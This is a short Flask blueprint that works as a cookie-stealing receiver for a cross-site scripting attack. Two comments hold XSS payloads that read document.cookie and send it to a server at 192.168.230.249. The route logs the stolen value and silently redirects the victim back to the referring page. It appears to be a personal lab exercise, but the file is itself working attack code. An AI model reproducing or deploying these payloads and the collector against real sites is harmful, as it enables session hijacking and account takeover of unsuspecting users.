from flask import Blueprint
from flask import redirect
from flask import request
from flask import url_for

test = Blueprint('test', __name__,
                 template_folder='templates')

# <script> var tocken = document.cookie; window.location.href='http://192.168.230.249:5000/test?tocken='+tocken</script>

# <script> var tocken = document.cookie; $.get('http://192.168.230.249:5000/test?tocken='+tocken, function(result){ console.log('hacked'); }); </script>

@test.route('/')
def testtocken():
    tocken = request.args.get('tocken')
    ref = request.headers.get('Referer')
    print(tocken)
    return redirect(ref,302,Response=None)
